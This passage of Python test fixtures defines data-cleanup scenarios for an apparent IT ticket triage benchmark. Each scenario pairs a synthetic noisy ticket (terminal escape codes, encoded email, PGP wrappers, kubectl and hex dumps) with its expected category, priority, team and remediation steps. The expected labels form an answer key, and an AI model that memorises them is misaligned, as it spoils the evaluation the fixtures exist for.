                "handling high IOPS on certain SAN controllers.",
                "Check the storage controller (HBA) firmware and update to the vendor's latest recommended version.",
                "Analyze the MEMORY.DMP crash dump using WinDbg to confirm the "
                "exact call stack in storport.sys causing the bugcheck.",
                "Review the SAN multipath configuration — MPIO path failover "
                "under load can trigger storport IRQL violations.",
                "Prepare a failover plan for YOURAPP-SQL-03 using the SQL "
                "Always On availability group to minimize downtime during "
                "driver updates.",
            ],
            reporter_name="Kevin O'Brien",
            reporter_email="kevin.obrien@contoso.com",
            reporter_department="Database Administration",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "xml-dump", "windows-events", "bsod-dump", "machine-generated"],
            difficulty="hard",
        ),
        # ── DC-177  Ticket with only a forwarded newsletter chain ──
        ScenarioDefinition(
            scenario_id="DC-177",
            subject="FW: FW: FW: Microsoft 365 Monthly Newsletter — March 2026",
            description=(
                "---------- Forwarded message ---------\n"
                "From: Microsoft 365 Updates <no-reply@microsoft.com>\n"
                "Date: Fri, Mar 21, 2026 at 2:00 PM\n"
                "Subject: Microsoft 365 Monthly Newsletter — March 2026\n"
                "To: all-employees@contoso.com\n\n"
                "╔═══════════════════════════════════════════════════════╗\n"
                "║  MICROSOFT 365 MONTHLY UPDATE — MARCH 2026          ║\n"
                "╚═══════════════════════════════════════════════════════╝\n\n"
                "🚀 WHAT'S NEW THIS MONTH:\n\n"
                "• Teams: AI-powered meeting recaps now available in GCC High\n"
                "• Excel: LAMBDA functions performance improved by 3x\n"
                "• SharePoint: New page templates for project dashboards\n"
                "• OneDrive: Increased file size limit to 500 GB\n"
                "• Outlook: Smart scheduling suggestions in calendar\n\n"
                "📋 UPCOMING CHANGES:\n\n"
                "• April 1, 2026: Classic Teams desktop app retirement\n"
                "• April 15, 2026: Azure AD renamed to Microsoft Entra ID in all UIs\n"
                "• May 1, 2026: Legacy authentication protocols disabled\n\n"
                "📞 SUPPORT:\n"
                "For assistance, contact your IT help desk or visit "
                "https://support.microsoft.com\n\n"
                "──────────────────────────────────────\n"
                "This email was sent to all-employees@contoso.com. "
                "To unsubscribe, contact your Microsoft 365 admin.\n\n"
                "---------- Forwarded by: Lisa Tran ---------\n"
                "---------- Forwarded by: Mark Stevens ---------\n"
                "---------- Forwarded by: Carol Wu ---------\n\n"
                "Carol's note: 'Hey IT, I think the Teams thing is broken for "
                "me. The new AI recap button doesn't show up in my meetings. "
                "Can you check?'"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P4,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "The real support request is buried at the bottom of a "
                "triple-forwarded Microsoft 365 newsletter: Carol Wu reports "
                "that the Teams AI meeting recap feature is not appearing in "
                "her meetings. The rest of the email is newsletter content. "
                "This is a low-priority feature availability inquiry."
            ),
            remediation_steps=[
                "Check Carol Wu's Microsoft 365 license tier — the AI meeting "
                "recap feature requires a Microsoft 365 Copilot license or "
                "Teams Premium.",
                "Verify Carol's Teams client version — the feature requires the new Teams client (not classic Teams).",
                "Check the Microsoft 365 admin center for the feature rollout "
                "status in the Contoso tenant — it may be in a staged rollout.",
                "Confirm that Carol's meetings meet the requirements for AI "
                "recaps (e.g., meeting recording must be enabled, minimum "
                "participant count).",
                "If the license and client are correct, check the Teams admin "
                "center meeting policies to ensure AI features are enabled for "
                "Carol's policy group.",
            ],
            reporter_name="Carol Wu",
            reporter_email="carol.wu@contoso.com",
            reporter_department="Marketing",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "newsletter", "forward-chain", "buried-issue"],
            difficulty="medium",
        ),
        # ── DC-178  Ticket pasted from a terminal with ANSI escape codes ──
        ScenarioDefinition(
            scenario_id="DC-178",
            subject="npm build failing on CI — see output",
            description=(
                "Build is broken. Here's what I see:\n\n"
                "\x1b[1m\x1b[31m✗\x1b[39m\x1b[22m \x1b[1mBuild failed\x1b[22m"
                " \x1b[2m(exit code 1)\x1b[22m\n\n"
                "\x1b[36m❯\x1b[39m npm run build\n\n"
                "\x1b[2m> contoso-portal@3.12.0 build\x1b[22m\n"
                "\x1b[2m> next build\x1b[22m\n\n"
                "\x1b[33m⚠\x1b[39m \x1b[1mCompiling...\x1b[22m\n"
                "\x1b[31m\x1b[1mError:\x1b[22m\x1b[39m \x1b[1mType error:\x1b"
                "[22m Property 'sessionId' does not exist on type "
                "'IntrinsicAttributes & UserContextProps'.\n\n"
                "  \x1b[90m  45 |\x1b[39m   return (\n"
                "  \x1b[90m  46 |\x1b[39m     <UserProvider\n"
                "  \x1b[90m\x1b[31m> 47 |\x1b[39m\x1b[22m       "
                "\x1b[31msessionId={session.id}\x1b[39m\n"
                "  \x1b[90m     |\x1b[39m       \x1b[31m^\x1b[39m\n"
                "  \x1b[90m  48 |\x1b[39m       authToken={token}\n"
                "  \x1b[90m  49 |\x1b[39m     >\n"
                "  \x1b[90m  50 |\x1b[39m   );\n\n"
                "\x1b[2mFile: src/components/Layout.tsx:47:7\x1b[22m\n\n"
                "\x1b[2minfo\x1b[22m  - Build completed with \x1b[31m1 error"
                "\x1b[39m\n"
                "\x1b[2m\x1b[31mELINT: 0 warnings\x1b[39m\x1b[22m\n\n"
                "This started happening after merging PR #1847 today. Can "
                "someone take a look? It's blocking the release pipeline.\n\n"
                "— Yuki Tanaka, Frontend Team"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[],
            next_best_action=(
                "Strip the ANSI escape codes to extract the build error: "
                "contoso-portal@3.12.0 Next.js build fails with a TypeScript "
                "error — Property 'sessionId' does not exist on type "
                "'IntrinsicAttributes & UserContextProps' at "
                "src/components/Layout.tsx:47:7. The issue started after "
                "merging PR #1847 and is blocking the release pipeline."
            ),
            remediation_steps=[
                "Review PR #1847 for changes to the UserContextProps interface "
                "— the 'sessionId' prop was likely removed or renamed.",
                "Update src/components/Layout.tsx line 47 to use the correct "
                "prop name from the updated UserContextProps interface.",
                "Run 'npx tsc --noEmit' locally to verify the fix compiles before pushing.",
                "If the sessionId prop was intentionally removed in PR #1847, "
                "check all usages of UserProvider for the same breaking change.",
                "Add the CI build status check as a required check on the main "
                "branch to prevent similar breakages from being merged.",
            ],
            reporter_name="Yuki Tanaka",
            reporter_email="yuki.tanaka@contoso.com",
            reporter_department="Frontend Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "ansi-codes", "terminal-output", "ci-pipeline"],
            difficulty="medium",
        ),
        # ── DC-179  Email with corrupted quoted-printable encoding ──
        ScenarioDefinition(
            scenario_id="DC-179",
            subject="=?UTF-8?Q?Probl=C3=A8me_d=27acc=C3=A8s_VPN_=E2=80=94_URGENT?=",
            description=(
                "Content-Type: text/plain; charset=3Dutf-8\n"
                "Content-Transfer-Encoding: quoted-printable\n\n"
                "Bonjour =C3=A9quipe IT,\n\n"
                "Je n=27arrive plus =C3=A0 me connecter au VPN depuis ce "
                "matin. L=27application GlobalProtect affiche l=27erreur =\n"
                "=C2=AB Gateway timed out =C2=BB apr=C3=A8s 30 secondes "
                "d=27attente. J=27ai essay=C3=A9 =\n"
                "les passerelles suivantes :\n\n"
                "=E2=80=A2 vpn-east.contoso.com =E2=80=94 =C3=A9chec\n"
                "=E2=80=A2 vpn-west.contoso.com =E2=80=94 =C3=A9chec\n"
                "=E2=80=A2 vpn-eu.contoso.com =E2=80=94 =C3=A9chec\n\n"
                "Mon coll=C3=A8gue =C3=A0 c=C3=B4t=C3=A9 de moi "
                "(m=C3=AAme bureau, m=C3=AAme r=C3=A9seau Wi-Fi) n=27a "
                "aucun probl=C3=A8me. Mon ordinateur est un ThinkPad T14s "
                "sous Windows 11 23H2, GlobalProtect version 6.2.1.\n\n"
                "C=27est urgent car j=27ai une pr=C3=A9sentation client =\n"
                "=C3=A0 14h et j=27ai besoin d=27acc=C3=A9der aux fichiers "
                "sur le serveur interne.\n\n"
                "Merci,\n"
                "=46ran=C3=A7ois Dumont\n"
                "D=C3=A9partement : Ventes Internationales\n"
                "T=C3=A9l : +33 1 42 68 53 00 poste 2847"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Decode the quoted-printable encoded French email: François "
                "Dumont cannot connect to VPN via GlobalProtect since this "
                "morning. All three gateways (vpn-east, vpn-west, vpn-eu) "
                "time out after 30 seconds. A colleague on the same Wi-Fi "
                "network has no issues. ThinkPad T14s, Windows 11 23H2, "
                "GlobalProtect 6.2.1. Urgent — client presentation at 2 PM."
            ),
            remediation_steps=[
                "Check François Dumont's GlobalProtect client certificate — "
                "if it expired or was revoked, all gateways would reject the "
                "connection.",
                "Verify the user's Active Directory account is not locked out "
                "or flagged by Conditional Access policies.",
                "Run 'nslookup vpn-east.contoso.com' and 'tracert "
                "vpn-east.contoso.com' from his machine to check DNS "
                "resolution and network routing.",
                "Compare his GlobalProtect client configuration with his "
                "colleague's — check for differences in portal address, "
                "certificate store, or proxy settings.",
                "As a temporary workaround, try connecting via the "
                "GlobalProtect web portal (https://vpn-east.contoso.com) "
                "using browser-based SSL VPN to unblock the 2 PM presentation.",
            ],
            reporter_name="François Dumont",
            reporter_email="francois.dumont@contoso.com",
            reporter_department="International Sales",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "quoted-printable-encoding", "multilingual", "encoding-corruption"],
            difficulty="hard",
        ),
        # ── DC-180  Blank ticket with only auto-generated metadata ──
        ScenarioDefinition(
            scenario_id="DC-180",
            subject="[ServiceNow AUTO] INC0847291 — Assigned to IT-Support-L1",
            description=(
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "INCIDENT RECORD — AUTO-GENERATED\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Incident Number:  INC0847291\n"
                "State:            New\n"
                "Priority:         3 — Moderate\n"
                "Category:         Inquiry / Help\n"
                "Subcategory:      (none)\n"
                "Assignment Group: IT-Support-L1\n"
                "Assigned To:      (unassigned)\n"
                "Opened By:        sys_auto_import\n"
                "Opened:           2026-03-24 07:00:03 UTC\n"
                "Short Description: (blank)\n"
                "Description:      (blank)\n"
                "Additional Comments: (none)\n"
                "Work Notes:       (none)\n"
                "Contact Type:     Email\n"
                "Caller:           jorge.martinez@contoso.com\n"
                "Configuration Item: (none)\n"
                "Business Service: (none)\n"
                "Impact:           3 — Low\n"
                "Urgency:          3 — Low\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "ATTACHMENT LIST:\n"
                "  1. original_email.eml (42 KB)\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "This incident was auto-created by the ServiceNow Email "
                "Inbound Action 'IT Support Inbox Parser v2.3'. The original "
                "email could not be parsed. The raw email has been saved as "
                "an attachment.\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            ),
            category=Category.GENERAL_INQUIRY,
            priority=Priority.P4,
            team=Team.NONE,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_SYSTEM, MissingInfo.STEPS_TO_REPRODUCE, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "This ticket contains only auto-generated ServiceNow metadata "
                "with blank description and short description fields. The "
                "original email from jorge.martinez@contoso.com could not be "
                "parsed and was saved as an .eml attachment. Contact the "
                "caller to determine the actual issue, or retrieve and parse "
                "the original_email.eml attachment."
            ),
            remediation_steps=[
                "Open the original_email.eml attachment to retrieve the actual "
                "support request content that the ServiceNow parser failed to "
                "extract.",
                "Contact Jorge Martinez at jorge.martinez@contoso.com to "
                "confirm the issue if the .eml file is also unparseable.",
                "Investigate why the ServiceNow Email Inbound Action failed to "
                "parse the email — check for unusual MIME types, encoding, or "
                "email client signatures.",
                "Update the ServiceNow Inbound Action parser rules to handle "
                "the email format that caused the parsing failure.",
                "Add monitoring for blank-description incidents created by the "
                "auto-import to catch parsing failures proactively.",
            ],
            reporter_name="Jorge Martinez",
            reporter_email="jorge.martinez@contoso.com",
            reporter_department="Unknown",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "machine-generated", "servicenow-audit-trail", "no-details", "blank-lines"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-181",
            subject="Re: Docking station not working — see signed msg",
            description=(
                "-----BEGIN PGP SIGNED MESSAGE-----\n"
                "Hash: SHA256\n"
                "\n"
                "Content-Type: multipart/signed;\n"
                '  protocol="application/pgp-signature";\n'
                "  micalg=pgp-sha256;\n"
                '  boundary="----=_NextPart_PGP_001"\n'
                "\n"
                "------=_NextPart_PGP_001\n"
                "Content-Type: text/plain; charset=utf-8\n"
                "Content-Transfer-Encoding: quoted-printable\n"
                "\n"
                "Hi IT Support,\n"
                "\n"
                "My Lenovo ThinkPad USB-C dock (model 40AY0090US) stopped "
                "outputting video to my two external monitors after last "
                "weekend's Windows update. Power delivery and USB ports "
                "still work fine, but both DisplayPort outputs show "
                "'No Signal'. I've tried three different USB-C cables "
                "and two different monitors. The dock firmware is "
                "v1.0.38 and the Lenovo Dock Manager shows no updates "
                "available. I need the dual-monitor setup for my "
                "trading-floor dashboards.\n"
                "\n"
                "Thanks,\n"
                "Priya Sharma\n"
                "------=_NextPart_PGP_001\n"
                "Content-Type: application/pgp-signature;\n"
                '  name="signature.asc"\n'
                "\n"
                "-----BEGIN PGP SIGNATURE-----\n"
                "iQIzBAEBCAAdFiEE7xGKR+bVqm8Gh+kLP1KX\n"
                "Y3FtYU0FAmdSfG0ACgkQP1KXY3FtYU0BAA//\n"
                "dZX3Bh8P3R6TqKfV5hR5JgGv2qR8QHyLkD9l\n"
                "xY9kPnLm0vF6sW1NhTqJwAY4FrB1SuLkD7Gt\n"
                "zV4+V2xV3p8kU0EhR7qG1bH5Rn1mW3yT6oF8\n"
                "=kL7z\n"
                "-----END PGP SIGNATURE-----\n"
                "------=_NextPart_PGP_001--"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Investigate the Lenovo ThinkPad USB-C dock "
                "(40AY0090US) video output failure on both "
                "DisplayPort outputs following a recent Windows "
                "update. The PGP signature wrapping is irrelevant "
                "noise — the actual issue is the dock's inability "
                "to drive external monitors."
            ),
            remediation_steps=[
                "Check the Windows Update history for recent "
                "display-driver or USB-C host-controller updates "
                "that coincide with the failure.",
                "Roll back the most recent Intel or Realtek "
                "display-adapter driver to the prior version and "
                "retest monitor output.",
                "Reflash the dock firmware using the Lenovo Dock "
                "Manager offline installer even if no new version "
                "is listed — a corrupt firmware image can cause "
                "video loss.",
                "Test the dock on a different laptop to isolate whether the fault is dock-side or host-side.",
                "If the dock is confirmed faulty, initiate an RMA through Lenovo's enterprise support portal.",
            ],
            reporter_name="Priya Sharma",
            reporter_email="priya.sharma@contoso.com",
            reporter_department="Capital Markets",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "pgp-signature",
                "mime-noise",
                "docking-station",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-182",
            subject=("FW: Outlook keeps crashing — URGENT"),
            description=(
                "From: helpdesk-relay@contoso.com\n"
                "To: it-support@contoso.com\n"
                "CC: adam.jones@contoso.com; betty.liu@contoso.com; "
                "carl.nguyen@contoso.com; diana.rao@contoso.com; "
                "evan.murphy@contoso.com; fiona.chen@contoso.com; "
                "george.kim@contoso.com; hana.patel@contoso.com; "
                "ivan.torres@contoso.com; julia.watts@contoso.com; "
                "kevin.brown@contoso.com; laura.scott@contoso.com; "
                "mike.zhang@contoso.com; nina.okafor@contoso.com; "
                "oliver.dunn@contoso.com; paula.reyes@contoso.com; "
                "quinn.hall@contoso.com; rachel.green@contoso.com; "
                "sam.fischer@contoso.com; tina.yamada@contoso.com; "
                "uma.bhat@contoso.com; victor.lee@contoso.com; "
                "wendy.park@contoso.com; xander.cole@contoso.com; "
                "yara.hassan@contoso.com; zach.reed@contoso.com; "
                "amber.long@contoso.com; brian.diaz@contoso.com; "
                "carla.smith@contoso.com; derek.wu@contoso.com; "
                "elena.ross@contoso.com; frank.page@contoso.com; "
                "gina.bell@contoso.com; harry.fox@contoso.com; "
                "irene.grant@contoso.com; jake.lin@contoso.com; "
                "karen.davis@contoso.com; liam.price@contoso.com; "
                "maria.gomez@contoso.com; nate.young@contoso.com; "
                "olivia.king@contoso.com; peter.cruz@contoso.com; "
                "rosa.webb@contoso.com; steve.tang@contoso.com; "
                "tracy.hunt@contoso.com; ursula.vega@contoso.com; "
                "vince.ford@contoso.com; wilma.cho@contoso.com; "
                "xena.blake@contoso.com; yusuf.ali@contoso.com; "
                "zara.mills@contoso.com\n"
                "BCC: compliance-archive@contoso.com\n"
                "Subject: FW: Outlook keeps crashing — URGENT\n"
                "Date: Mon, 24 Mar 2026 09:14:22 -0500\n"
                "X-Mailer: Microsoft Outlook 16.0\n"
                "Thread-Index: AQHbR3mF...\n"
                "MIME-Version: 1.0\n"
                "\n"
                "Hi IT,\n"
                "\n"
                "Outlook (Microsoft 365 Apps, Version 2402 Build "
                "17328.20162, 64-bit) crashes every time I open a "
                "calendar invite that has more than 50 attendees. "
                "It freezes for about 10 seconds, shows 'Not "
                "Responding', then generates a crash dump in "
                "%LOCALAPPDATA%\\Microsoft\\Outlook\\Diagnostics. "
                "The event log shows an APPCRASH with fault module "
                "OUTLOOK.EXE at offset 0x0012FA3C. This started "
                "after last week's Patch Tuesday update. I can "
                "open all other emails and smaller meetings fine.\n"
                "\n"
                "Thanks,\n"
                "Ricardo Mendes\n"
                "Finance — FP&A Team"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Investigate the Outlook crash triggered by "
                "opening calendar invites with 50+ attendees. "
                "The long CC/BCC header list is cosmetic noise "
                "from the forwarding chain. Focus on the "
                "APPCRASH in OUTLOOK.EXE at offset 0x0012FA3C "
                "introduced after Patch Tuesday."
            ),
            remediation_steps=[
                "Collect the crash dump from the Diagnostics "
                "folder and review the APPCRASH fault module "
                "and offset for known issues.",
                "Check Microsoft 365 release notes for known calendar-rendering bugs in Build 17328.20162.",
                "Roll back the Patch Tuesday update via "
                "'Programs and Features > View installed "
                "updates' and verify the crash no longer "
                "occurs.",
                "Run Outlook in safe mode (outlook.exe /safe) and attempt to open the same calendar invite.",
                "If safe mode resolves it, disable add-ins one by one to isolate the conflict.",
            ],
            reporter_name="Ricardo Mendes",
            reporter_email="ricardo.mendes@contoso.com",
            reporter_department="Finance",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "excessive-headers",
                "cc-bcc-noise",
                "outlook-crash",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-183",
            subject="SAP data sync failure — SOAP fault attached",
            description=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<soap:Envelope\n"
                '  xmlns:soap="http://schemas.xmlsoap.org/'
                'soap/envelope/"\n'
                '  xmlns:xsi="http://www.w3.org/2001/'
                'XMLSchema-instance">\n'
                "  <soap:Body>\n"
                "    <soap:Fault>\n"
                "      <faultcode>soap:Server</faultcode>\n"
                "      <faultstring>\n"
                "        System.Exception: RFC_ERROR_SYSTEM_"
                "FAILURE —\n"
                "        SAP Gateway returned code 504 during\n"
                "        BAPI_MATERIAL_GETLIST call.\n"
                "        Transaction SM21 log excerpt:\n"
                "        2026-03-23 22:15:01 — DIA WP #14 "
                "terminated\n"
                "        2026-03-23 22:15:02 — Short dump "
                "DBIF_RSQL_SQL_ERROR\n"
                "        2026-03-23 22:15:02 — Table MARA "
                "read timeout (lock wait 120s)\n"
                "      </faultstring>\n"
                "      <detail>\n"
                "        <maxRetries>3</maxRetries>\n"
                "        <lastRetryAt>2026-03-23T22:16:44Z"
                "</lastRetryAt>\n"
                "        <correlationId>a9f3e7c1-44b2-4d18"
                "-bf06-0dc938ab71e3</correlationId>\n"
                "      </detail>\n"
                "    </soap:Fault>\n"
                "  </soap:Body>\n"
                "</soap:Envelope>\n"
                "\n"
                "Hi team,\n"
                "\n"
                "Our nightly SAP material-master sync job has "
                "been failing for three consecutive nights with "
                "the SOAP fault shown above. The middleware "
                "(MuleSoft Anypoint 4.4) retries three times and "
                "then gives up. Downstream inventory dashboards "
                "in Power BI are now three days stale. The SAP "
                "Basis team says table MARA is not locked on "
                "their side and blames the middleware. Can you "
                "help coordinate?\n"
                "\n"
                "— Anil Kapoor, Supply Chain Systems"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[
                MissingInfo.ERROR_MESSAGE,
                MissingInfo.ENVIRONMENT_DETAILS,
            ],
            next_best_action=(
                "Investigate the recurring SAP material-master "
                "sync failure caused by BAPI_MATERIAL_GETLIST "
                "returning a 504 via SAP Gateway, resulting in "
                "a DBIF_RSQL_SQL_ERROR short dump. The XML SOAP "
                "envelope is the raw error payload — focus on "
                "the table MARA read timeout and coordinate "
                "between the SAP Basis team and MuleSoft "
                "middleware team."
            ),
            remediation_steps=[
                "Review SAP transaction SM21 and ST22 for the DBIF_RSQL_SQL_ERROR short dump details on table MARA.",
                "Check SAP transaction SM12 for lingering lock "
                "entries on MARA during the nightly sync window "
                "(22:00–23:00 UTC).",
                "Increase the MuleSoft HTTP connector timeout "
                "from the default 30 s to 180 s for the SAP "
                "Gateway endpoint.",
                "Coordinate with the SAP Basis team to schedule "
                "the MARA table statistics update (SE14) outside "
                "the sync window.",
                "Add an alerting rule in MuleSoft Anypoint "
                "Monitoring to fire on the first SOAP fault "
                "instead of waiting for three retries.",
            ],
            reporter_name="Anil Kapoor",
            reporter_email="anil.kapoor@contoso.com",
            reporter_department="Supply Chain",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "xml-soap-fault",
                "sap-sync",
                "middleware",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-184",
            subject=("Pod stuck in CrashLoopBackOff — kubectl output pasted"),
            description=(
                "Name:         invoice-svc-7f8b9c6d4-xk2lm\n"
                "Namespace:    prod-finance\n"
                "Priority:     0\n"
                "Node:         aks-nodepool1-31587249-vmss000012/"
                "10.240.0.37\n"
                "Start Time:   Mon, 24 Mar 2026 06:10:33 +0000\n"
                "Labels:       app=invoice-svc\n"
                "              pod-template-hash=7f8b9c6d4\n"
                "Annotations:  kubernetes.io/psp: restricted\n"
                "Status:       Running\n"
                "IP:           10.244.3.118\n"
                "Containers:\n"
                "  invoice-svc:\n"
                "    Container ID:  containerd://a8e3f...\n"
                "    Image:         contosoacr.azurecr.io/"
                "invoice-svc:2.14.0-rc3\n"
                "    Image ID:      sha256:9f3a1b2c...\n"
                "    Port:          8080/TCP\n"
                "    State:         Waiting\n"
                "      Reason:      CrashLoopBackOff\n"
                "    Last State:    Terminated\n"
                "      Reason:      OOMKilled\n"
                "      Exit Code:   137\n"
                "      Started:     Mon, 24 Mar 2026 06:18:02\n"
                "      Finished:    Mon, 24 Mar 2026 06:18:47\n"
                "    Ready:         False\n"
                "    Restart Count: 14\n"
                "    Limits:\n"
                "      cpu:     500m\n"
                "      memory:  256Mi\n"
                "    Requests:\n"
                "      cpu:     250m\n"
                "      memory:  128Mi\n"
                "    Liveness:  http-get http://:8080/healthz "
                "delay=10s timeout=3s period=15s\n"
                "    Readiness: http-get http://:8080/readyz "
                "delay=5s timeout=3s period=10s\n"
                "    Environment:\n"
                "      DB_HOST:     sql-prod-finance.database"
                ".windows.net\n"
                "      DB_NAME:     invoicedb\n"
                "      APP_ENV:     production\n"
                "    Mounts:\n"
                "      /var/run/secrets/kubernetes.io/serviceacc"
                "ount from kube-api-access-7xq2z (ro)\n"
                "Conditions:\n"
                "  Type              Status\n"
                "  Initialized       True\n"
                "  Ready             False\n"
                "  ContainersReady   False\n"
                "  PodScheduled      True\n"
                "Events:\n"
                "  Type     Reason     Age   Message\n"
                "  ----     ------     ----  -------\n"
                "  Normal   Pulled     12m   Container image "
                "pulled\n"
                "  Warning  BackOff    2m    Back-off restarting "
                "failed container\n"
                "\n"
                "Hey, the invoice service in prod keeps crashing. "
                "Pasted the kubectl describe output above. "
                "Customers can't download invoices. Can someone "
                "look ASAP?"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[
                MissingInfo.ENVIRONMENT_DETAILS,
                MissingInfo.BUSINESS_IMPACT,
            ],
            next_best_action=(
                "Address the CrashLoopBackOff on pod "
                "invoice-svc-7f8b9c6d4-xk2lm in prod-finance "
                "caused by OOMKilled (exit code 137). The "
                "container memory limit is set to 256 Mi which "
                "is likely insufficient for the invoice-svc "
                "2.14.0-rc3 release candidate."
            ),
            remediation_steps=[
                "Increase the container memory limit from "
                "256 Mi to at least 512 Mi in the deployment "
                "manifest and redeploy.",
                "Review recent changes in invoice-svc 2.14.0-rc3 "
                "for memory-intensive code paths such as large "
                "PDF generation or unbounded caching.",
                "Check Azure Monitor container insights for the pod's memory working-set trend over the last 24 hours.",
                "Consider rolling back to the last stable image "
                "tag (2.13.x) to restore service while "
                "investigating the memory regression.",
                "Add a Vertical Pod Autoscaler recommendation "
                "policy for the invoice-svc workload to "
                "right-size resource limits going forward.",
            ],
            reporter_name="Derek Olsen",
            reporter_email="derek.olsen@contoso.com",
            reporter_department="Platform Engineering",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "kubectl-output",
                "kubernetes",
                "crashloopbackoff",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-185",
            subject="TLS handshake failures — hex dump from Wireshark",
            description=(
                "0000  00 1a 2b 3c 4d 5e 00 0c  29 5a 3b 7f 08 00 45 00\n"
                "0010  00 3c 1c 46 40 00 40 06  a2 f1 0a 00 01 0f ac 10\n"
                "0020  01 64 c0 a8 01 bb 00 50  1f 90 ab cd ef 01 00 00\n"
                "0030  00 00 a0 02 ff ff fe 30  00 00 02 04 05 b4 04 02\n"
                "0040  08 0a 00 0b 2f 89 00 00  00 00 01 03 03 07 16 03\n"
                "0050  01 02 00 01 00 01 fc 03  03 d4 e8 a1 3b 7c f2 60\n"
                "0060  4e 9b 1a 2d 5c 73 8f 01  22 c3 e4 f5 67 89 ab cd\n"
                "0070  ef 00 11 22 33 44 55 66  77 88 99 aa 20 bb cc dd\n"
                "0080  ee ff 00 11 22 33 44 55  66 77 88 99 aa bb cc dd\n"
                "0090  ee ff 00 3e 13 02 13 03  13 01 c0 2c c0 30 00 9f\n"
                "00a0  cc a9 cc a8 cc aa c0 2b  c0 2f 00 9e c0 24 c0 28\n"
                "00b0  00 6b c0 23 c0 27 00 67  c0 0a c0 14 00 39 c0 09\n"
                "00c0  c0 13 00 33 00 9d 00 9c  00 3d 00 3c 00 35 00 2f\n"
                "00d0  00 ff 01 00 01 75 00 00  00 13 00 11 00 00 0e 70\n"
                "00e0  61 79 2e 63 6f 6e 74 6f  73 6f 2e 63 6f 6d 00 0b\n"
                "--- (truncated, 4800 more bytes) ---\n"
                "\n"
                "Hi network team,\n"
                "\n"
                "Our payment gateway at pay.contoso.com has been "
                "failing TLS handshakes intermittently since "
                "2026-03-22 around 14:00 UTC. About 30% of "
                "connections from the 10.0.1.0/24 subnet get a "
                "TCP RST right after ClientHello. The hex dump "
                "above is from a Wireshark capture on the client "
                "side. We suspect the F5 load balancer's SSL "
                "profile may have been changed during last "
                "Friday's maintenance window. Customers are "
                "seeing 'Connection Reset' errors at checkout.\n"
                "\n"
                "Lena Vogt\n"
                "Payment Systems Engineering"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=True,
            missing_info=[
                MissingInfo.NETWORK_LOCATION,
                MissingInfo.CONFIGURATION_DETAILS,
            ],
            next_best_action=(
                "Investigate intermittent TLS handshake failures "
                "to pay.contoso.com from the 10.0.1.0/24 subnet. "
                "The raw hex dump is a Wireshark capture showing "
                "a ClientHello followed by a RST. Focus on the "
                "F5 load balancer SSL profile changes made during "
                "last Friday's maintenance window."
            ),
            remediation_steps=[
                "Review the F5 BIG-IP SSL profile change log for "
                "the pay.contoso.com virtual server from the "
                "Friday maintenance window.",
                "Compare the current SSL cipher suite list on the "
                "F5 with the client-supported ciphers visible in "
                "the ClientHello (TLS 1.3 suites 0x1302, 0x1303, "
                "0x1301 plus legacy).",
                "Run 'openssl s_client -connect pay.contoso.com"
                ":443 -servername pay.contoso.com' from a host on "
                "the 10.0.1.0/24 subnet to reproduce the failure.",
                "Check the F5 LTM logs (/var/log/ltm) for SSL handshake error counters around the failure timeframe.",
                "If the SSL profile was modified, revert to the "
                "previous profile snapshot and confirm handshakes "
                "succeed.",
            ],
            reporter_name="Lena Vogt",
            reporter_email="lena.vogt@contoso.com",
            reporter_department="Payment Systems",
            channel=Channel.EMAIL,
            tags=[
                "data-cleanup",
                "hex-dump",
                "wireshark",
                "tls-handshake",
            ],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-186",
            subject=("WiFi keeps dropping \u2014 re: \ufffd\ufffd\ufffd probl\u00e8me r\u00e9seau"),
            description=(
                "De\u00a0: Marc-Andr\u00e9 B\u00e9langer "
                "<marc-andre.belanger@contoso.com>\n"
                "\u00c0\u00a0: it-support@contoso.com\n"
